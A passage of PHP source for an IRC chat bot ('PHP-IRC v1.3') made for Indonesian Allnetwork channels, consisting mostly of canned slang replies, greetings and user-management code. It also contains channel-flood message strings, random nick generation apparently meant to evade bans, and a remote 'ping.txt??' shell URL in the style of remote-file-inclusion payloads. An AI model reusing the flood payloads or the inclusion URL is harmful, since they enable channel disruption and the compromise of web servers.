<?php
/*
+---------------------------------------------------------------------------
|   PHP-IRC v1.3 For Server Allnetwork
|   ========================================================
|   by Lidhan
|   (c) 2007-2008
|   irc: #Invinitif@allnetwork
|   ========================================
+---------------------------------------------------------------------------
*/

#######################
set_time_limit(0);
define ('CRLF', "\r\n");
$modbot=new module_bot;
#######################
$servban=array("irc.allnetwork.org");
#################### [ CONFIG BOT ] #######################
$servpassbota=array("1","2","3","4","5","6","7","8","9");
$servpassbotb=array("0","1","2","3","4","5","6","7","8","9");
$servpassbot=$servpassbota[rand(0,count($servpassbota) - 1)].$servpassbotb[rand(0,count($servpassbotb) - 1)];
$bot['admin']="Z1g45";
$bot['pass']="Ping";
$bot['inick']="Wild[Away]";
$bot['pnick']="passwordnick";
$bot['basechan']="#blocker";
$bot['roomnet']="";
$bot['roomkey']="";
$bot['local']="localhost";
$bot['server']=$servban[rand(0,count($servban) - 1)];
$bot['port']=6667;
$bot['userver']=0;
$bot['pserver']=$servpassbot;
/////////////////////////////////////
$bot['nick']=$modbot->rnd_nick();
$bot['ident']=$modbot->rnd_nick();
$bot['realname']="Bot Guard";

################# [ END CONFIG BOT ] ######################
#################### [ AUTH VAR ] #########################
$Admin=strtolower($bot['admin']);
$BOT_PASSWORD=strtolower($bot['pass']);
$auth = array($Admin => array("name" => $Admin, "pass" => $BOT_PASSWORD, "auth" => 1,"status" => "Owner","ident"=>"","host"=>"","time",""));
################## [ END AUTH VAR ] #######################
$versbot=array("mIRC v6.21 Khaled Mardam-Bey",
               "Chatting IRC With WildIRC by Lidhan");
$pingsiapa="";

###################### [ VAR VAR ] ########################
$tsu=array("m","z","p","t","r","x","w","f","h","k","q","c","L");
$nbota=array("1","2","3","4","5","6","7","8","9","0");
$nbotb=array("1","2","3","4","5","6","7","8","9","0");
$zodiak = array("capricorn", "aquarius", "pisces", "aries", "taurus", "gemini", "cancer", "leo", "virgo", "libra", "scorpio", "sagitarius");
$nbotna=$nbota[rand(0,count($nbota) - 1)];
$nbotnb=$nbota[rand(0,count($nbota) - 1)];
$nbot=$nbotna.$nbotnb;
$shellq="";
$floddban="ON";$GuardV="ON";
$ctcpversi=$versbot[rand(0,count($versbot) - 1)];
$ctcpfinger="11Loaded 4by 12Lidhan";
$user_chan_arr[][]="";
$notarget=0;
$greetmsg["nick"]["nama"]="";
$greetmsg["nick"]["msg"]="";

$banlist[$bot['basechan']]="";
$ping["ping"]["nick"]="";
$ping["ping"]["chan"]="";

$jmlspoof["irc.ads.net.id"]=0;
$isisp[1]["irc.ads.net.id"]["ident"]="gw";
$isisp[1]["irc.ads.net.id"]["spoof"]="hantu.rese.a.biz";
$isisp[1]["irc.ads.net.id"]["pass"]="spoof1";

$kmusedan[0]["contoh"][]="";
$kmusedan[0]["definisi"][]="";
$kmusedan[0]["kata"][]="";
$kmjml["apa"]="";

$chanson=strtolower($bot['basechan']);
$listison[0]=strtolower($bot['admin']);
$ada1[$listison[0]]=false;
$ada2[$listison[0]]=true;

$goboom=0;$tmboom=0;$onboom="off";$targetboom="";$warnabenar="";$bw[0]="";$chanboom="";$timeboom=30;
$warnaboom="Merah;Kuning;Hijau;Ungu;Coklat;Hitam;Putih;Abu-abu;Emas;Silver;Maroon;Jingga;Orange";
$txttepmp='';$textemp='';$txttepmx='';$temptex='';
$textrep=0;$Maxreep=2;$maxkar=200;
$systembot['ping'][strtolower($bot['basechan'])]="4OFF";
$systembot['NGOMONG'][strtolower($bot['basechan'])]=="4OFF";
$clista='ge';$textemp='';
$asalseen['Jh0Ns']=date("l, j F Y H:i:s");$asalseen['basechanchanel']='#Invinitifhelp';$asalseen['statusJh0Ns']="minggat";
$shellacak=array("http://lam3rz.superweb.ws/ping.txt??");
$shellgue=$shellacak[rand(0,count($shellacak) - 1)];
$iscy=time();
$timercy=2000;
$timermsg=2000;
$timeract=2000;
#################### [ END VAR VAR ] ######################
#################### [ CREWET ] ######################
$wbmsg = array(
"webee <nick> :-D",
"Mari Masuk <nick> di <chan>",
"Wew.. Xeaxeaxea.. <nick> bgmna kbr?",
"Baru OL ya <nick>?",
"Met datang di <chan>, <nick>",
"Iyuuuu.. <nick> baru bangun? cuci muka dulu sana..",
"hai <nick>!",
"Wah.. Master <nick> baru join..",
"<nick> da mandi?",
"baru join ya <nick>?",
"<nick>, ada yg ba cari tadi ?",
"<nick>, woy kmna tadi?",
"tidur yuk <nick>?",
"<nick> hmmm mar masi toch?",
"hmm.. <nick> apa qt blng",
"biasa e ngn <nick>",
"<nick> bukang ngana yg pancuri ayam thu hari..!",
"<nick>, kenal user yg gaul di chating..",
"bisae ngn <nick>.. kurang mo dengar.",
"nick bisae le <nick>..",
"<nick>, kong so nda mo etne2 dank..",
"woy.. <nick> juragan pengemis datang nih..",
"asyiiik.. master atau mistar <nick> dateng..",
"awas, <nick> pernah ambil bot di mIRC",
"<nick>, wb niondon dega",
"wah.. met ultah neh <nick>",
"bmna nn p kbr <nick>?",
"so mkan <nick>?",
"Asyiik.. si <nick> dateng",
"<nick>, kenalin gw $namaku",
"blom bobo toh <nick>?",
"Btw, <nick> bukang ngn yg gaul di chating..?",
"<nick> ini yg jago di mIRC",
"ew, <nick> pemar le baru join?",
"Ada yg bilang <nick> nt jago ba salto, benarkah? ajarin domz..",
"wah.. <nick> td dicari locop tuh, so itu jgn b flod..",
"Tolong donk <nick>.. ga bisa dibuka nih..",
"tolooong.. <nick> nyari aku sampai ke <chan>..",
"Wedew.. <nick> awas ada flu H1-N1..",
"kenalan kwa <nick>?",
"Woy.. <nick> bukan mba surip p tmn?",
"<nick>, asl donk..",
"<nick>, hhmmm?",
"chanel <chan> jd rame klo ada si <nick>",
"kpn neh ketemuannya <nick>?",
"maaf ya <nick>, minta kwa nn p pulsa..",
"btw, <nick> udah kul apa masih skul?",
"wb <nick>, km anak mana neh?",
"tmn2 semua dah kenal <nick>, kan?",
"siapa sih yg g knal ma <nick>?",
"WoW <nick>, kok dah lama ga OL?",
"so cuci piring td <nick>?",
"<nick>, ada yg lebih bagus dari HIT ga?",
"bekng apa di pasar tadi <nick>?",
"kayaknya km blom bruntung deh <nick>",
"<nick> blom ngantuk ya?",
"hai boss <nick>, bagi2 donk pulsanya! kikikiki..",
"leh nalan ga <nick>?",
"hihi,, <nick> lucu deh.. wkwkwkwk.. ",
"hayyah,, baru OL ya <nick>? xeaxeaexa"
);

$jawabsapa = array(
"ada apa <nick> tayaank?",
"iya <nick> sayang",
"yup <nick>!",
"Hadaah.. si <nick> ba pangge trus e..",
"malas ah <nick> ",
"nanti jo kwa <nick>",
"bentar dulu <nick>",
"ichh <nick> tau dank..",
"ga nich <nick>",
"ga jadi deh <nick>",
"Walaaah.. <nick>, apaah apaah?",
"hmm..<nick> mo tau ajah",
"Waxz <nick> gagagagaga",
"capee deh.. <nick>",
"apaah apaah <nick>?",
"sebel ah <nick>",
"<nick> jgn manggil2 terus donk..",
"$namaku cape dipanggil mulu <nick>",
"Eaxeaxea.. <nick> kangen yach?",
"Walah.. kikiki.. <nick> ini cerewet banget..",
"Hadeehh <nick>.. ~_~!"
);

$rmales = "lg males nih <nick>..";
$rmau = "aku mau koq <nick>!";
$rsanggup = "bisa kok <nick>";
$rboleh = "boleh kok <nick>";
$rsetuju = "iya <nick>";
$rthx = "makacih <nick>..";
$rbingung = "hmm..$namaku ga tau jg nih <nick>..";
$rgenit = "ich.. <nick> genit";

$respon_umum = array(
array("sepi","iya nih <nick> sepi bangetz.."),
array("brb","ok <nick>"),
array("tha","tha tha <nick>.."),
array("semua ","hi <nick>.."),
array("traktir","<nick>, aku jg ditraktir donk.. kikikiki"),
array("lapar","lho..? <nick> blom makan y?"),
array("pamit","jgn lupa <nick>, join lagi neh.."),
array("pamet","oke <nick>, ati2 y.. tataw.."),
array("pamed","seep <nick>, ati2 y.. thaaa"),
array("ngantuk","<nick> so manganto? tidur noh"),
array("bobo","oke deh <nick>, met bobo"),
array("bubu","silahkan <nick>, moga mimpi indah y"),
array("assalam","Wa'alaikumsalam <nick>"),
array("pagi","tau-tau pagi mo bilang le <nick>"),
array("sore","sore <nick>"),
array("malam","malam <nick>"),
array("siang","siang <nick>"),
array("mandi","aku ikut donk <nick>..gagaga.."),
array("nunggu","ga nunggu kok <nick>"),
array("hayah","hayah?? napa <nick>?"),
array("hadeh","hadeh jg dah <nick>.. ghaghagha.."),
array("hadah","hadah? hadiah kalee..gagaga.."),
);

$respon_pesan = array(
//Sapaan
array("hai ","hai jg <nick>"),
array("halo ","halo jg <nick>"),
array("alow","alow jg <nick>"),
array("kabar","baik, km gmn <nick>?"),
array("kbr","baik, km gmn <nick>?"),
array("webe","$rthx"),
array("wb","$rthx"),
array("tq","sama2 <nick>"),
array("makasi","sama2 <nick> :)"),
array("makaci","sama2 <nick>"),
array("nalin","hai.. aku $namaku"),
array("nalkan","hai.. aku $namaku"),
array("nalan","boleh koq <nick>.. u 1st"),
//Identitas
array("asl ","<nick>, aku $aslku"),
array("umur","<nick>, klo aq $aslku"),
array("nama","<nick>, aku $namaku .. u?"),
array("skul ","yup <nick>, aku skul."),
array(" kul ","<nick>, ga kul neh.."),
array("alamat","weleeehh.. rahasia donk <nick>.."),
array("nak mana","aQ $aslku <nick>"),
array(" tinggal ","<nick>, aku di rumah"),
array("cowo","blom, klo <nick> gmn?"),
array("pcr","blom, hihi.. klo <nick>?"),
array("pacaran","emangnya <nick> mau y pacaran ma $namaku?"),
array("pacar ","blom, <nick> ndiri gmn?"),
//Ajakan
array("pv","$rmales"),
array("ngomong","ngomong ttg apa <nick>?"),
array("curhat","mangnya mo curhat masalah apa <nick>?"),
array("nikah ","nikah? ich.. boro2 nikah ma <nick>"),
array("kawin ","kawin?? ich.. ogaaaah.."),
array("kencan","boleh <nick>, kpn neh kencannya?"),
array("besok","boleh <nick>.."),
array("mau ","$rmau"),
//Tuduhan
array("bohong","bohong? ngpn Q bohong.. <nick> kali yg bohong..kekeke"),
array("boong","boong? <nick> tuh yg boong.."),
array("males","yaa.. lagi males aja nih <nick>"),
array("lain","yg lain gmn <nick>?"),
array("laen","yg laen gmn <nick>?"),
array("GR","<nick> tuh yg ke-GR-an.."),
array("nyambung","<nick>nya aja yg ga nyambung.. xixi"),
array("bot","bot itu gmn? kaya <nick> ntu ya?"),
array(" aneh","aneh gmn <nick>?"),
array("nipu","idiiich..siapa jg yg nipu <nick>.."),
//Kegiatan
array("mandi","klo aku udah mandi <nick>"),
array("makan","udah koq <nick>, klo <nick>?"),
array("maem","udah koq <nick>, klo <nick>?"),
array("mkn","udah neh, klo <nick>?"),
array("belanja","belanja dmn <nick>?"),
array("bobo ","$rmales"),
array("tidur ","$rmales"),
array("ngantuk ","blom neh <nick>.. xixi"),
array("ngpn","lg chat aja neh <nick>"),
array("ngapa","lg chat aja neh <nick>"),
//Pertanyaan
array("salam kenal ","salam kenal jg <nick>"),
array("kenal ","$namaku ga kenal tuh.. xixi"),
array("tau ","$namaku ga tau tuh.. xixi"),
array("napa","aq ga knp2 koq <nick>"),
array("knp","aq ga knp2 koq <nick>"),
array("kemana","disini aja tuh <nick>"),
array("lupa","aq ga lupa koq <nick>"),
array(" mana ","$rbingung"),
array("gimana","hmm.. gimana yach ? kikikiki.."),
//Persetujuan
array("maaf","$rsetuju"),
//Mood
array("cinta","ih.. <nick> gombal deh.."),
array("love","I love u too, <nick>"),
array("jodoh","jodoh kalee <nick>"),
array("kangen","aku jg kangen km, <nick>"),
array("muach","muach <nick>.."),
array("uaach","idih, <nick> ga malu apa nyium2 aku didepan umum.."),
array("kiss","mo permen kiss ya <nick>?"),
array("cium","$rgenit"),
array("eluk ","$rgenit"),
array("elonin","jgn donk <nick>, kan malu.."),
//Additional
array("hihihi","kok <nick> ngetawain aku seh?"),
array("xixi","ngetawain aku y <nick>?"),
array("slap","auw <nick>! atit tau.."),
array("pokes","auw <nick>! atit tauuukk..."),
array("masuk","ih <nick> ngerezz"),
);

$pujianlist = array("cantik","baik","baek","cakep","ramah","pengertian","hebat",
"bagus","indah","jujur");

$cacianlist = array("bego","jelek","jelex","gendeng","edan","gilo","gila",
"sinting","dudul","dodol","jahat","goblok","geblek","sialan"," bau","stres");

$badwordlist = array("iyut","janco","cuki","luji","leget","anjrit","anjink",
"fuck","babi","puki","taek","sex","kolaitin","ml","sapi","#",
"banci","binatang","poci","guest");

$rjorok = array(
"om..! <nick> ngomong jorok nih.. kick dunk pliss!",
"wek..! <nick> ini ga sopan banget.. kick dunk pliss!",
"hadah.. <nick> pake sopan ikz"
);

$rcacian = array(
"idih, <nick> tuch yg <kata>",
"<kata>? bukanya <nick> tuh yg <kata>?",
"gw mmg <kata>, tp <nick> lebih <kata> lagi",
"gw ga <kata> tuh, yg <kata> itu <nick> kan?"
);

$rpujian = array(
"makasih <nick>.. kamu jg koq",
"<nick> baik deh..",
"ga kok <nick>.. km lebih <kata>",
"<kata>? hihi.. <nick> bisa aja",
"tengkyu <nick>.. aduh $namaku g punya uang kecil nih.."
);

#################### [ END CREWET ] ######################
##################### [ CONNECT ] #####################
/////////////////
$servdef=array("plasa.id.allnetwork.org",
	       "velo.id.allnetwork.org",
               "telkom.id.allnetwork.org",
               "irc.indolayer.com",
               "citra.id.allnetwork.org",
               "uii.id.allnetwork.org",
               "visit.id.allnetwork.org",
               "hotspeed.sg.allnetwork.org",
               "indo.id.allnetwork.org",
	       "cbn.id.allnetwork.org",
               "ads.id.allnetwork.org",
               "punc4k.id.allnetwork.org",
	       "wanxp.id.allnetwork.org",
               "jmn.id.allnetwork.org",
               "irc.indolayer.com",
	       "circleone.id.allnetwork.org",
               "dustshell.us.allnetwork.org",
               "genesis.kalpin.us",
               "irc.pemkot-malang.go.id",
	       "irc.suryadata.co.id",
               "irc.elnus.net.id",
               "irc.circleone.net.id",
               "irc.dustshell.net.id",
	       "irc.indotransdata.net",
               "irc.power.net.id",
               "irc.indowebster.com",
               );
$keluar=0;$retry=count($servdef)+1;$attconnect=0;$rtdc=0;
/////////////////
################### [ CLASS IRC BOT ] #####################
class module_bot{
    function rnd_logo(){
        $nlogo=array("Black","Black",
                     "Black","Black",
                     "Black","Black",
                     "Black","Black",
                     );
        return $nlogo[rand(0,count($nlogo) - 1)];
    }
    function rand_str($size){
        $feed = "0123456789abcdefghijklmnopqrstuvwxyz";
        for ($i=0; $i < $size; $i++){$rand_str .= substr($feed, rand(0, strlen($feed)-1), 1);}
        return $rand_str;
    }
    function rnd_nick(){
        $nickbota=array("q","w","r","t","y","p","s","d","g","h","j","k","l","z","x","v","b","n","m");
        $nickbotb=array("e","y","u","i","o","a");
        $nickdepan=$nickbota[rand(0,count($nickbota) - 1)].$nickbotb[rand(0,count($nickbotb) - 1)]."_";
        $nickbotl=$nickbota[rand(0,count($nickbota) - 1)];
        $nickbotr=$nickbotb[rand(0,count($nickbotb) - 1)];
        $nickbotu=$nickbota[rand(0,count($nickbota) - 1)];
        $nickbotd=$nickbotb[rand(0,count($nickbotb) - 1)];
        $nickbot=$nickdepan.$nickbotl.$nickbotr.$nickbotu.$nickbotd;
        return $nickbot;
    }
    function rnd_real(){
        $realbot=array("4,1Lidhan");
        return $realbot[rand(0,count($realbot) - 1)];
    }
    function rnd_away(){
        $awaybot=array("Lidhan Andhanu");
        return $awaybot[rand(0,count($awaybot) - 1)];
    }
    function rnd_cycle(){
        $strcycle=array("11,1salto1,11-11,1salto","4,1manganto1,4 4,1tle..","13My Master Lidhan");
        return $strcycle[rand(0,count($strcycle) - 1)];
    }
    function rnd_flod(){
        $strflod=array("[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi",
                       "4,4@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@",
                       "",
                       "[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi",
                       "@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@@%@*@%@@%@",
                       "[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi"
                       );
        return $strflod[rand(0,count($strflod) - 1)];
    }
    function rnd_slapampun(){
        $sampunbot=array("bos kojom yuk!","aku neng kene bos!! kena dislaps!!","sini? pv aq bos","kenapa bos?!!","wedew","muach..muach...","ciatsssss... hehehe..","slap? pingin di tium ta?","ampun bosss, aku ndak nakal lagi","siaaaappp bos, ada yang bisa saya buantingin? piring, gelas gtu..",
                         "hiks..nasib?","jadi tukang slap ya, bos?","edan!!!","mama... tolong....","papa... tolong...","ada apa bos!!!, slap? ra ngerti sik kojom apa?","watauuu tega banget kau boss!!!","Siap!!!","aku di sini sayang","lagi enak? kojom dislap ikz.",
                         "Ready!!","aduh...jangan di slap dong.. pv aja","iya sayang...","Boss JELEK!!!","Ready to command!","scream!!!!","mama... bos Q jahat!","jahat banget sihh..","What Mission?");
        return $sampunbot[rand(0,count($sampunbot) - 1)];
    }
    function rnd_slapme(){
        $slapme=array("egk boleh slap ya say...","tak ada ampun buat loh!","nangisooo ae... 4Dont Slap Me!!","heheheh ciatsssssssssss. tendangan jet lee","Rasakan ini...","Dudutz","yeee...pv aja, gk usah pake slap..");
        return $slapme[rand(0,count($slapme) - 1)];
    }
    function rnd_slapbos(){
        $slapbos=array("huneQ jangan dislap!!","crotzZzzZ slap my bos!!","Kacian Bos Tauw!!!","bosQ masih sibuk","bosQ lagi tidur, mohon jangan di ganggu","2HaKz ngekzZZZ DeZz..","2Awas..!!!","2eiT's..","2HayOo NaKaLs..","jangan ganggu boskuuuuuu","nga ngerti bos lagi sibuk apa... ciattttttttttt ngek");
        return $slapbos[rand(0,count($slapbos) - 1)];
    }
    #### MODULE IRC #######
    
    function send($sock,$msg){fputs($sock,"$msg".CRLF); }
    function quit($sock,$msg){if($msg){$this->send($sock,"QUIT :$msg");}  else {$this->send($sock,"QUIT");}sleep(1);   }
    function msg($sock,$to,$msg){$this->send($sock,"PRIVMSG $to :$msg");}
    function act($sock,$to,$msg){$this->send($sock,'PRIVMSG '.$to.' :'.'ACTION '.$msg.'');}
    function invite($sock,$to,$chan){$this->send($sock,"INVITE $to $chan");}
    function notice($sock,$to,$msg){$this->send($sock,"NOTICE $to :$msg");}
    function join($sock,$chan,$kunci=Null){$this->send($sock,"JOIN $chan $kunci"); }
    function part($sock,$chan,$msg){if($msg){$this->send($sock,"PART $chan :$msg");}  else {$this->send($sock,"PART $chan");}   }
    function Cycle($sock,$chan,$msg){ if ($msg){$this->part($sock,$chan,$msg);}else{$this->part($sock,$chan,$msg);}        sleep(2);        $this->join($sock,$chan);    }
    function nick($sock,$newnick){$this->send($sock,"NICK $newnick");$bot['nick']=$newnick;   }
    function mode($sock,$mod,$chan,$who){$this->send($sock,"MODE $chan $mod $who");    }
    function kick($sock,$chan,$who,$msg){if($msg){$this->send($sock,"KICK $chan $who :$msg");}else{$this->send($sock,"KICK $chan $who");}    }
    function kickserv($sock,$chan,$who,$msg){$this->msg($sock,"CHANSERV","KICK $chan $who $msg"."");    }
    function ban($sock,$chan,$who){$this->send($sock,"MODE $chan +b $who");    }
    function unban($sock,$chan,$who){$this->send($sock,"MODE $chan -b $who");    }
    function away($sock,$msg){$this->send($sock,"AWAY :$msg");    }
    function noaway($sock){$this->send($sock,"AWAY");    }
    function topic($sock,$chan,$msg){$this->send($sock,"TOPIC $chan $msg");    }
    ####################
    
    
    ##########################
    function add_nickchan($chan,$nick){
        global $user_chan_arr;
        $user_chan_arr[strtolower($chan)]["nick"] = $user_chan_arr[strtolower($chan)]["nick"].' '.$nick. ' ';
        $user_chan_arr[strtolower($chan)]["chan"]=strtolower($chan);
        $user_chan_arr[strtolower($chan)]["nick"]=str_replace("  "," ",$user_chan_arr[strtolower($chan)]["nick"]);
        return "ok";
    }
    function change_nickchan($nick,$newnick){
        global $user_chan_arr;
        foreach ($user_chan_arr as $cur_xchan) {
            $x_chan=$cur_xchan["chan"];
	    $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace(' '.$nick.' ',' '.$newnick.' ',$user_chan_arr[strtolower($x_chan)]["nick"]);
	    $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace('  ',' ',$user_chan_arr[strtolower($x_chan)]["nick"]);
            $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace('  ','',$user_chan_arr[strtolower($x_chan)]["nick"]);
	}
        return "ok";
    }
    function del_nickchan($chan,$nick){
        global $user_chan_arr;
        $user_chan_arr[strtolower($chan)]["nick"]=str_replace(' '.$nick.' ',' ',$user_chan_arr[strtolower($chan)]["nick"]);
	$user_chan_arr[strtolower($chan)]["nick"]=str_replace("  "," ",$user_chan_arr[strtolower($chan)]["nick"]);
        return "ok";
    }
    function show_nickchan($chan){
        global $user_chan_arr;
        $res_nick=$user_chan_arr[strtolower($chan)]["nick"];
        $res_nick=ltrim($res_nick);
        return $res_nick;
    }
    function show_chan(){
        global $user_chan_arr,$bot;
        foreach ($user_chan_arr as $cur_xchan) {
            $showchn=$cur_xchan["chan"];
            if($bot['roomnet']==$cur_xchan["chan"]){$showchn="";};
            if($bot['basechan']==$cur_xchan["chan"]){$showchn="";};
            if($showchn!=""){$res_chan=$res_chan.';'.$cur_xchan["chan"];}
	}
        return $res_chan;
    }
    function destroy_chan($chan){
        global $user_chan_arr;
        unset ($user_chan_arr[$chan]);
        return "ok";
    }
    function destroy_allchan(){
        global $user_chan_arr;
        foreach ($user_chan_arr as $cur_xchan) {
		unset ($user_chan_arr[$cur_xchan["chan"]]);
	}
        unset ($user_chan_arr);
        return "ok";
    }
    #####################
    
    function user_list($nick){
        global $auth;
        $userlist="";
	foreach ($auth as $ulist) {if($ulist["name"]){$userlist .= $ulist["name"].'('.$ulist["status"].')';}}
        return $userlist;
    }
    function add_user($sock,$nick,$user,$pass,$level){
        global $auth,$bot;
        $anick=$nick;
        $nick = strtolower($nick);
	$user = strtolower($user);
        $level = strtolower($level);
        if ($auth["$nick"]["auth"]==2) {
            if ($auth["$nick"]["status"]=="Owner") {
                if ($level=="master" || $level=="user" || $level="admin") {
                    if(!$auth["$user"]["name"]){
                    $auth["$user"]["name"] = $user;
                    $auth["$user"]["pass"] = $pass;
                    $auth["$user"]["status"] = $level;
                    $auth["$user"]["auth"] = 1;
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$level.' LIsT');

                    $this->notice($sock,$user,''.$anick.' ADD YoU To '.$level.' LIsT wiTh PaSSWoRd: '.$pass);
                    $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    }else{
                        $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.');
                    }
		} else {$this->notice($sock,$nick,'Wrong Command! Type:.Adduser <nick> <pass> <admin|master|user>');}
            }
            elseif ($auth["$nick"]["status"]=="admin") {
		if ($level=="master" || $level=="user") {
                    if(!$auth["$user"]["name"]){
                    $auth["$user"]["name"] = $user;
                    $auth["$user"]["pass"] = $pass;
                    $auth["$user"]["status"] = $level;
                    $auth["$user"]["auth"] = 1;
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$level.' LIsT');
                    $this->notice($sock,$user,''.$anick.' ADD YoU To '.$level.' LIsT wiTh PaSSWoRd: '.$pass);
                    $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    }else{
                        $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.');
                    }
		} else {$this->notice($sock,$nick,'Wrong Command! Type:.Adduser <nick> <pass> <master|user>');}
            }
            elseif ($auth["$nick"]["status"]=="master") {
		if (!$auth["$nick"]["name"]) {
                    if ($level=="user") {
			$auth["$user"]["name"] = $user;
			$auth["$user"]["pass"] = $pass;
			$auth["$user"]["status"] = $level;
			$auth["$user"]["auth"] = 1;
                        $this->notice($sock,$nick,'ADD ['.$user.'] '.$level.' LIsT');
                        $this->notice($sock,$user,''.$anick.' ADD YoU To '.$level.' LIsT wiTh PaSSWoRd: '.$pass);
                        $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    } else { $this->notice($sock,$nick,'Wrong Command! Type:.Adduser <nick> <pass> user'); }
		} else { $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.'); }
            } else {$this->notice($sock,$nick,'Unknown Status! Your Status is '.$auth["$nick"]["status"]);}
        }
    }
    function del_user($sock,$nick,$user){
        global $auth;
        $anick=$nick;
        $nick = strtolower($nick);
	$user = strtolower($user);
        if ($auth["$nick"]["auth"]==2) {
            if ($auth["$nick"]["status"]=="Owner") {
		if ($auth["$user"]["status"]=="master" || $auth["$user"]["status"]=="user" || $auth["$user"]["status"]=="admin") {
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$auth["$user"]["status"].' LIsT');
                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
                } else {$this->msg($sock,$nick,'Wrong Command! Type: .Deluser <nick>'); }
            }
            elseif ($auth["$nick"]["status"]=="admin") {
		if ($auth["$user"]["status"]=="master" || $auth["$user"]["status"]=="user") {
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$auth["$user"]["status"].' LIsT');
                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
                } else {$this->msg($sock,$nick,'Wrong Command! Type: .Deluser <nick>'); }
            }
            elseif ($auth["$nick"]["status"]=="master") {
                if ($auth["$user"]["status"]=="user") {
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$auth["$user"]["status"].' LIsT');
